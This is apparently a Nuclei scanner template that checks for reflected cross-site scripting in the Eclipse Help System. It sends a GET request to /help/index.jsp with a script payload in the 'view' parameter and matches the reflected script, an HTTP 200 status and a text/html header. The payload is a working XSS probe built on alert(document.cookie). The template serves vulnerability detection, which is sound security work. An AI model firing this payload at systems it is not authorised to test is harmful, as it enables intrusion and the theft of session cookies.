id: eclipse-help-system-xss

info:
  name: Eclipse Help System Cross-Site Scripting
  author: pikpikcu
  severity: medium
  tags: ibm,xss

requests:
  - method: GET
    path:
      - "{{BaseURL}}/help/index.jsp?view=%3Cscript%3Ealert(document.cookie)%3C/script%3E"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "<script>alert(document.cookie)</script>"
        part: body
      - type: word
        words:
          - "text/html"
        part: header
